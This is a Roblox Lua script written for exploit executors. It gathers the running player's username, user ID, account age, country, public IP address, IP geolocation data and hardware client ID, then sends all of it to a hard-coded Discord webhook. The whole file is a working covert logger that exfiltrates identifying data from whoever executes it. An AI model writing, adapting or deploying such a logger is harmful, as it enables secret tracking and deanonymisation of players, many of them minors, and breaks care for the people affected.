local LocalPlayer = game:GetService("Players").LocalPlayer

-- Player Info
local DName = game.Players.LocalPlayer.DisplayName -- PlayerInfo Display Name
local Name = game.Players.LocalPlayer.Name -- Name
local Userid = game.Players.LocalPlayer.UserId -- UserId
local Country = game.LocalizationService.RobloxLocaleId -- Country
local GetIp = game:HttpGet("https://v4.ident.me/") -- IP
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'

-- Game Info
local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local webhookcheck =
    (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
    (secure_load and "Sentinel") or
    (pebc_execute and "ProtoSmasher") or
    (KRNL_LOADED and "Krnl") or
    (is_sirhurt_closure and "SirHurt") or
    (identifyexecutor():find("ScriptWare") and "Script-Ware") or
    ("Unsupported")

local url = "https://discord.com/api/webhooks/1126471431186821170/qLuTcjb0e24GPJEyl2_HUwx47doKrEP5gDTCm6eDTzj_e84FRBEp8UA_WeYp3_npvAPw"

local data = {
    ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
    ["content"] = "",
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = "(Someone Executed The Script)",
                ["url"] = "https://roblox.com",
            },
            ["description"] =
                "\n__[Player Info](https://www.roblox.com/users/" .. Userid .. ")__" ..
                " **\nDisplay Name:** " .. DName ..
                " \n**Username:** " .. Name ..
                " \n**User Id:** " .. Userid ..
                "\n**MembershipType:** " .. MembershipType ..
                "\n**AccountAge:** " .. AccountAge ..
                "\n**Country:** " .. Country ..
                "**\nIP:** " .. GetIp ..
                "**\nHwid:** " .. GetHwid ..
                "**\nDate:** " .. tostring(os.date("%m/%d/%Y")) ..
                "**\nTime:** " .. tostring(os.date("%X")) ..
                "\n\n__[Game Info](https://www.roblox.com/games/" .. game.PlaceId .. ")__" ..
                "\n**Game:** " .. GAMENAME ..
                " \n**Game Id**: " .. game.PlaceId ..
                " \n**Exploit:** " .. webhookcheck ..
                "" ..
                "\n\n**Data:**" .. "```" .. GetData .. "```" ..
                "\n\n**JobId:**" .. "```" .. ConsoleJobId .. "```",
            ["type"] = "rich",
            ["color"] = tonumber(0xf2ff00),
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=150&height=150&format=png"
            }
        }
    }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}

request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
wait(1)
